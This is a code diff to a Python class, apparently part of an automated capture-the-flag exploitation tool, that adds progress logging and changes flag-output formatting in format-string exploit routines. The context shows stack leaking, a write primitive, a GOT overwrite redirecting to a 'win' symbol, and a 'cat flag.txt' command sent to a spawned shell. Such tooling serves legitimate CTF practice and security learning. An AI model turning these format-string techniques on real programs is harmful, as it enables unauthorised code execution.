@@ -11,8 +11,11 @@ class FMT:
         self.filename = analysis.binary
         self.e = ELF(self.filename)
         self.fart_print = Print(v_lvl)
-    
+        
+        self.fart_print.info("Format string bug likely!")
+
     def build_exploit(self):
+        self.fart_print.info("Attempting to discover the constraings to exploiting the format string bug")
         payload = None
         
         if not self.stack_leak():
@@ -22,6 +25,7 @@ class FMT:
                 self.got_overwrite()
 
     def stack_leak(self):
+        self.fart_print.info("Leaking the values on the stack with format string bug")
         hex_vals = []
         
         # TODO: Variable length
@@ -46,12 +50,13 @@ class FMT:
             end = vals.find("}")
             flag = vals[start:end+1]
             flag_stripped = flag.strip("\n")
-            self.fart_print.flag(f"{self.analysis.bin_hash},{self.filename},{flag_stripped}")
+            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},{flag_stripped}")
             return True
         else:
             return False
 
     def write_prim(self):
+        self.fart_print.info("Overwriting the pwnme variable")
         offset = self.find_write_prim_offset()
         if offset:
             # Find the value
@@ -89,6 +94,7 @@ class FMT:
         pass
 
     def got_overwrite(self):
+        self.fart_print.info("GOT overwrite with format string bug")
         offset = self.find_write_prim_offset()
         if offset:
             win = self.e.sym['win']
@@ -109,11 +115,11 @@ class FMT:
             p.recvline()
 
             flag = p.recvline().decode('utf-8').strip('\n')
-            self.fart_print.flag(f"{self.analysis.bin_hash},{self.filename},{flag}")
+            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},{flag}")
         elif self.analysis.has_binsh():
             p.sendline(b"cat flag.txt")
             p.recvuntil(b"flag")
             flag = p.recvline().decode('utf-8').strip('\n')
-            self.fart_print.flag(f"{self.analysis.bin_hash},{self.filename},flag{flag}")
+            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},flag{flag}")
 
         p.close()
